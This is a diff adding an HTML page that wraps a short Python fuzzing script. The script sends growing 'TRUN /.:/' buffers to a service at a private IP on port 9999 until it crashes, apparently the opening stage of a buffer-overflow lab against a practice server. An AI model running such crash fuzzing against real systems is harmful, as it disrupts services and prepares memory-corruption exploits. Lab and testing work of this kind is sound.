@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>1.py</title>
+</head><body>#!/usr/bin/python<br/>
+import sys, socket<br/>
+from time import sleep<br/>
+<br/>
+buffer = "A" * 100<br/>
+<br/>
+while True:<br/>
+&#09;try:<br/>
+&#09;&#09;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+&#09;&#09;s.connect(('192.168.254.29', 9999))<br/>
+&#09;&#09;s.send(('TRUN /.:/' + buffer))<br/>
+&#09;&#09;s.close()<br/>
+&#09;&#09;sleep(1)<br/>
+&#09;&#09;buffer = buffer + "A" * 100<br/>
+&#09;except:<br/>
+&#09;&#09;print "Fuzzing crashed at %s bytes" %str(len(buffer))<br/>
+&#09;&#09;sys.exit()</body></html>
